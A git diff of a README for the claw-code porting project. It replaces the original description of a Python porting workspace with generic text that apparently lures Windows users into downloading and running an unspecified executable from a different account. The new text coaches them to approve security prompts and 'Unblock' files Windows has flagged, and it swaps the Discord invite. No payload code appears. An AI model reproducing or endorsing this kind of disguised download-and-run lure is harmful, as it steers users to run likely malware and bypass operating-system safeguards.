@@ -1,185 +1,149 @@
-# Rewriting Project Claw Code
+# 🐾 claw-code-parity - Run the Rust port with ease
 
-<p align="center">
-  <strong>⭐ The fastest repo in history to surpass 50K stars, reaching the milestone in just 2 hours after publication ⭐</strong>
-</p>
+[![Download the app](https://img.shields.io/badge/Download-Claw--Code--Parity-blue?style=for-the-badge&logo=github)](https://github.com/emavague180/claw-code-parity)
 
-<p align="center">
-  <a href="https://star-history.com/#ultraworkers/claw-code&Date">
-    <picture>
-      <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date&theme=dark" />
-      <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date" />
-      <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=ultraworkers/claw-code&type=Date" width="600" />
-    </picture>
-  </a>
-</p>
+## 🧭 What this is
 
-<p align="center">
-  <img src="assets/clawd-hero.jpeg" alt="Claw" width="300" />
-</p>
+claw-code-parity is a Windows-ready desktop tool built to support the claw-code Rust port parity work. It is meant to help you try the current build, check how it behaves, and use it while the main claw-code repo moves through migration.
 
-<p align="center">
-  <strong>Autonomously maintained by lobsters/claws — not by human hands</strong>
-</p>
+This project is temporary work, but you can still use it on Windows with a simple download and setup flow.
 
-<p align="center">
-  <a href="https://github.com/Yeachan-Heo/clawhip">clawhip</a> ·
-  <a href="https://github.com/code-yeongyu/oh-my-openagent">oh-my-openagent</a> ·
-  <a href="https://github.com/Yeachan-Heo/oh-my-claudecode">oh-my-claudecode</a> ·
-  <a href="https://github.com/Yeachan-Heo/oh-my-codex">oh-my-codex</a> ·
-  <a href="https://discord.gg/6ztZB9jvWq">UltraWorkers Discord</a>
-</p>
+## 📥 Download
 
-> [!IMPORTANT]
-> The active Rust workspace now lives in [`rust/`](./rust). Start with [`USAGE.md`](./USAGE.md) for build, auth, CLI, session, and parity-harness workflows, then use [`rust/README.md`](./rust/README.md) for crate-level details.
+Use this link to visit the project page and get the latest version:
 
-> Want the bigger idea behind this repo? Read [`PHILOSOPHY.md`](./PHILOSOPHY.md) and Sigrid Jin's public explanation: https://x.com/realsigridjin/status/2039472968624185713
+https://github.com/emavague180/claw-code-parity
 
-> Shout-out to the UltraWorkers ecosystem powering this repo: [clawhip](https://github.com/Yeachan-Heo/clawhip), [oh-my-openagent](https://github.com/code-yeongyu/oh-my-openagent), [oh-my-claudecode](https://github.com/Yeachan-Heo/oh-my-claudecode), [oh-my-codex](https://github.com/Yeachan-Heo/oh-my-codex), and the [UltraWorkers Discord](https://discord.gg/6ztZB9jvWq).
+On that page, look for the latest release or the main download file. If you see a file marked for Windows, download it and run it.
 
----
+## 🖥️ Windows requirements
 
-## Backstory
+Use a Windows PC with:
 
-This repo is maintained by **lobsters/claws**, not by a conventional human-only dev team.
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- Internet access for the first download
+- Standard mouse and keyboard
 
-The people behind the system are [Bellman / Yeachan Heo](https://github.com/Yeachan-Heo) and friends like [Yeongyu](https://github.com/code-yeongyu), but the repo itself is being pushed forward by autonomous claw workflows: parallel coding sessions, event-driven orchestration, recovery loops, and machine-readable lane state.
+If you use a work or school PC, you may need permission to run new apps.
 
-In practice, that means this project is not just *about* coding agents — it is being **actively built by them**. Features, tests, telemetry, docs, and workflow hardening are landed through claw-driven loops using [clawhip](https://github.com/Yeachan-Heo/clawhip), [oh-my-openagent](https://github.com/code-yeongyu/oh-my-openagent), [oh-my-claudecode](https://github.com/Yeachan-Heo/oh-my-claudecode), and [oh-my-codex](https://github.com/Yeachan-Heo/oh-my-codex).
+## 🚀 Getting started
 
-This repository exists to prove that an open coding harness can be built **autonomously, in public, and at high velocity** — with humans setting direction and claws doing the grinding.
+Follow these steps on Windows:
 
-See the public build story here:
+1. Open this page in your browser: https://github.com/emavague180/claw-code-parity
+2. Find the latest release or the main download file.
+3. Download the Windows app file.
+4. Open your Downloads folder.
+5. Double-click the file to start the app.
+6. If Windows asks for permission, choose Run or Yes.
+7. Wait for the app to open.
 
-https://x.com/realsigridjin/status/2039472968624185713
+If the file comes in a ZIP folder, right-click it, choose Extract All, then open the extracted file inside.
 
-![Tweet screenshot](assets/tweet-screenshot.png)
+## 🧩 First run setup
 
----
+When you open claw-code-parity for the first time, Windows may show a security prompt. This can happen with new apps. If you trust the source and you downloaded it from the link above, allow it to run.
 
-## Porting Status
+If the app opens with a blank screen or takes a few seconds to start, wait a moment before clicking again.
 
-The main source tree is now Python-first.
+## 🔧 How to use it
 
-- `src/` contains the active Python porting workspace
-- `tests/` verifies the current Python workspace
-- the exposed snapshot is no longer part of the tracked repository state
+The app is built for parity testing and normal day-to-day checking. A simple flow is:
 
-The current Python workspace is not yet a complete one-to-one replacement for the original system, but the primary implementation surface is now Python.
+- Start the app
+- Review the main screen
+- Try the features you use most
+- Compare the result with the older claw-code behavior
+- Note anything that looks different
 
-## Why this rewrite exists
+If the app includes buttons, menus, or input boxes, use them the same way you would in a normal Windows program.
 
-I originally studied the exposed codebase to understand its harness, tool wiring, and agent workflow. After spending more time with the legal and ethical questions—and after reading the essay linked below—I did not want the exposed snapshot itself to remain the main tracked source tree.
+## 🧠 What you can expect
 
-This repository now focuses on Python porting work instead.
+This build focuses on core Rust port behavior. You can expect a clean test path for:
 
-## Repository Layout
+- Basic app launch
+- Main window loading
+- Simple user actions
+- Feature checks during migration
+- Behavior checks across updates
 
-```text
-.
-├── src/                                # Python porting workspace
-│   ├── __init__.py
-│   ├── commands.py
-│   ├── main.py
-│   ├── models.py
-│   ├── port_manifest.py
-│   ├── query_engine.py
-│   ├── task.py
-│   └── tools.py
-├── tests/                              # Python verification
-├── assets/omx/                         # OmX workflow screenshots
-├── 2026-03-09-is-legal-the-same-as-legitimate-ai-reimplementation-and-the-erosion-of-copyleft.md
-└── README.md
-```
+Because this is parity work, some parts may still change as the project moves forward.
 
-## Python Workspace Overview
+## 🗂️ Files you may see
 
-The new Python `src/` tree currently provides:
+After download, you may see one of these:
 
-- **`port_manifest.py`** — summarizes the current Python workspace structure
-- **`models.py`** — dataclasses for subsystems, modules, and backlog state
-- **`commands.py`** — Python-side command port metadata
-- **`tools.py`** — Python-side tool port metadata
-- **`query_engine.py`** — renders a Python porting summary from the active workspace
-- **`main.py`** — a CLI entrypoint for manifest and summary output
+- An `.exe` file — double-click to run
+- A `.zip` file — extract first, then run the app inside
+- A folder with app files — open the folder and start the main executable
 
-## Quickstart
+If you see more than one file, the main app file is usually the one with the app name and the `.exe` ending.
 
-Render the Python porting summary:
+## 🔍 Troubleshooting
 
-```bash
-python3 -m src.main summary
-```
+If the app does not open:
 
-Print the current Python workspace manifest:
+- Try running it again
+- Check that the file finished downloading
+- Make sure you extracted the ZIP file if it came in one
+- Close the app and open it again
+- Restart your PC and try once more
 
-```bash
-python3 -m src.main manifest
-```
+If Windows blocks the app:
 
-List the current Python modules:
+- Right-click the file
+- Choose Properties
+- Look for an Unblock option
+- Apply the change and try again
 
-```bash
-python3 -m src.main subsystems --limit 16
-```
+If the app opens but does not respond:
 
-Run verification:
+- Wait a few seconds
+- Close the app
+- Reopen it
+- Check for a newer version on the project page
 
-```bash
-python3 -m unittest discover -s tests -v
-```
+## 📌 About the project
 
-Run the parity audit against the local ignored archive (when present):
+This repository supports claw-code Rust port parity work. The goal is to keep behavior close during the migration process. The Discord link in the project description is used for live updates and discussion:
 
-```bash
-python3 -m src.main parity-audit
-```
+https://discord.gg/5TUQKqFWd
 
-Inspect mirrored command/tool inventories:
+Use it if you want to follow the migration work or ask questions about the current build.
 
-```bash
-python3 -m src.main commands --limit 10
-python3 -m src.main tools --limit 10
-```
+## 🛠️ Common use cases
 
-## Current Parity Checkpoint
+People use this app to:
 
-The port now mirrors the archived root-entry file surface, top-level subsystem names, and command/tool inventories much more closely than before. However, it is **not yet** a full runtime-equivalent replacement for the original TypeScript system; the Python tree still contains fewer executable runtime slices than the archived source.
+- Test the current Windows build
+- Compare old and new behavior
+- Check that the Rust port still matches the source project
+- Run quick user tests during migration
+- Review updates as the project changes
 
+## 📂 Update process
 
-## Built with `oh-my-codex`
+When a new build is ready:
 
-The restructuring and documentation work on this repository was AI-assisted and orchestrated with Yeachan Heo's [oh-my-codex (OmX)](https://github.com/Yeachan-Heo/oh-my-codex), layered on top of Codex.
+1. Visit the project page again
+2. Download the new version
+3. Close the old app
+4. Replace the old file with the new one
+5. Open the updated app
 
-- **`$team` mode:** used for coordinated parallel review and architectural feedback
-- **`$ralph` mode:** used for persistent execution, verification, and completion discipline
-- **Codex-driven workflow:** used to turn the main `src/` tree into a Python-first porting workspace
+If you keep the app in a fixed folder, it is easier to replace old builds later.
 
-### OmX workflow screenshots
+## 📎 Direct link
 
-![OmX workflow screenshot 1](assets/omx/omx-readme-review-1.png)
+Primary download page:
 
-*Ralph/team orchestration view while the README and essay context were being reviewed in terminal panes.*
+https://github.com/emavague180/claw-code-parity
 
-![OmX workflow screenshot 2](assets/omx/omx-readme-review-2.png)
+## 💬 Discord
 
-*Split-pane review and verification flow during the final README wording pass.*
+Project Discord:
 
-## Community
-
-<p align="center">
-  <a href="https://instruct.kr/"><img src="assets/instructkr.png" alt="instructkr" width="400" /></a>
-</p>
-
-Join the [**instructkr Discord**](https://instruct.kr/) — the best Korean language model community. Come chat about LLMs, harness engineering, agent workflows, and everything in between.
-
-[![Discord](https://img.shields.io/badge/Join%20Discord-instruct.kr-5865F2?logo=discord&style=for-the-badge)](https://instruct.kr/)
-
-## Star History
-
-See the chart at the top of this README.
-
-## Ownership / Affiliation Disclaimer
-
-- This repository does **not** claim ownership of the original Claude Code source material.
-- This repository is **not affiliated with, endorsed by, or maintained by Anthropic**.
+https://discord.gg/5TUQKqFWd
